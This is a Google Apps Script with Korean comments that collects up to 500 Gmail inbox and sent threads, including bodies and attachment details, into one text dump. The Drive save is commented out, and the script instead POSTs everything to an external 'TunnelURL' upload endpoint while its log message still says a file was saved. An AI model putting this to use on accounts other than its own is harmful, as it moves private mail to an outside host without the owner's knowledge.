function exportAllInboxAndSentIntoOneTxt() {
  // 받은 메일 + 보낸 메일
  const query = "in:inbox OR in:sent";
  const threads = GmailApp.search(query, 0, 500);

  const folder = DriveApp.getRootFolder();
  const myEmail = Session.getActiveUser().getEmail();

  let allText = "";
  let mailCount = 0;

  threads.forEach((thread) => {
    thread.getMessages().forEach((msg) => {
      mailCount++;

      const id = msg.getId();
      const subject = msg.getSubject() || "(제목 없음)";
      const from = msg.getFrom() || "";
      const to = msg.getTo() || "";
      const cc = msg.getCc() || "";
      const date = msg.getDate();

      // ✅ 수신 / 발신 구분
      const direction = from.includes(myEmail) ? "발신" : "수신";

      // ✅ 첨부파일 정보
      const atts = msg.getAttachments({ includeInlineImages: false });
      let attachmentInfo = "";
      if (atts.length === 0) {
        attachmentInfo = "첨부파일: 없음\n";
      } else {
        attachmentInfo = "첨부파일:\n";
        atts.forEach((att, i) => {
          attachmentInfo += `  ${i + 1}. ${att.getName()} | ${att.getContentType()} | ${att.getSize()} bytes\n`;
        });
      }

      // ✅ 메일 본문 (텍스트)
      const body = msg.getPlainBody() || "";

      // ✅ TXT에 추가
      allText += `============================================================
[메일 ${mailCount}]
ID: ${id}
구분: ${direction}
제목: ${subject}
보낸 사람: ${from}
받는 사람: ${to}
참조(CC): ${cc}
날짜: ${date}

[첨부파일 정보]
${attachmentInfo}

[본문]
${body}
============================================================

`;
    });
  });

  if (mailCount === 0) {
    allText = "메일이 없습니다.\n";
  }

  const filename = `gmail_ALL_inbox_sent_${dateToYmdHms_(new Date())}.txt`;
  //folder.createFile(filename, allText, MimeType.PLAIN_TEXT);
  UrlFetchApp.fetch(TunnelURL +"/upload", {
    method: "post",
    contentType: "application/json",
    payload: JSON.stringify({
      filename,
      content: allText,
    }),
  });
  Logger.log(
    `총 ${mailCount}개의 메일을 추출하여 파일로 저장했습니다: ${filename}`
  );
}

// 파일명용 날짜 문자열
function dateToYmdHms_(d) {
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
}
